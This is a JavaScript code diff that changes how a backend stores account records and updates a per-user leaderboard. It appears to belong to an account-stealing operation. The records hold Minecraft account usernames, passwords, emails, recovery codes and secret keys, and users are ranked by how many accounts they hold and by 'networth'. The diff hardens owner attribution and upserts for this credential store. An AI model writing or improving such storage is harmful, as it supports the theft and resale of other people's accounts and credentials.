@@ -58,6 +58,11 @@ function updateSecureConfig(userId, newSettings) {
 }
 
 async function insertAccountRecord(accData, userId) {
+  const ownerId = userId !== null && userId !== undefined ? String(userId).trim() : '';
+  if (!ownerId) {
+    throw new Error('Cannot save account without a valid user_id');
+  }
+
   const currentEpoch = Math.floor(Date.now() / 1000);
   const uid = accData.uid || generateUid();
 
@@ -78,10 +83,22 @@ async function insertAccountRecord(accData, userId) {
     `INSERT INTO accounts (
       uid, user_id, username, ownsmc, capes, email, recoverycode, secemail, 
       secretkey, password, stats_id, time
-    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    ON CONFLICT(uid) DO UPDATE SET
+      user_id = COALESCE(NULLIF(accounts.user_id, ''), excluded.user_id),
+      username = excluded.username,
+      ownsmc = excluded.ownsmc,
+      capes = excluded.capes,
+      email = excluded.email,
+      recoverycode = excluded.recoverycode,
+      secemail = excluded.secemail,
+      secretkey = excluded.secretkey,
+      password = excluded.password,
+      stats_id = excluded.stats_id,
+      time = excluded.time`,
     [
       uid,
-      userId,
+      ownerId,
       accData.username || 'Unknown',
       accData.ownsmc || 'Purchased',
       accData.capes || 'None',
@@ -95,22 +112,29 @@ async function insertAccountRecord(accData, userId) {
     ]
   );
 
-  run(
-    `INSERT INTO accountsbyuser (user_id, uid, time, claimed) VALUES (?, ?, ?, 0)`,
-    [userId, uid, String(currentEpoch)]
-  );
+  const existingLink = get('SELECT 1 FROM accountsbyuser WHERE user_id = ? AND uid = ?', [ownerId, uid]);
+  if (!existingLink) {
+    run(
+      `INSERT INTO accountsbyuser (user_id, uid, time, claimed) VALUES (?, ?, ?, 0)`,
+      [ownerId, uid, String(currentEpoch)]
+    );
+  }
+
+  try {
+    run(`UPDATE extrainformation SET user_id = ? WHERE uid = ? AND (user_id IS NULL OR user_id = '')`, [ownerId, uid]);
+  } catch (e) {}
 
   // Update leaderboard
-  const lb = get('SELECT * FROM leaderboard WHERE user_id = ?', [userId]);
+  const lb = get('SELECT * FROM leaderboard WHERE user_id = ?', [ownerId]);
   if (lb) {
     run(
       'UPDATE leaderboard SET amount = amount + 1, networth = networth + ? WHERE user_id = ?',
-      [networthVal, userId]
+      [networthVal, ownerId]
     );
   } else {
     run(
       'INSERT INTO leaderboard (user_id, networth, amount) VALUES (?, ?, 1)',
-      [userId, networthVal]
+      [ownerId, networthVal]
     );
   }
 
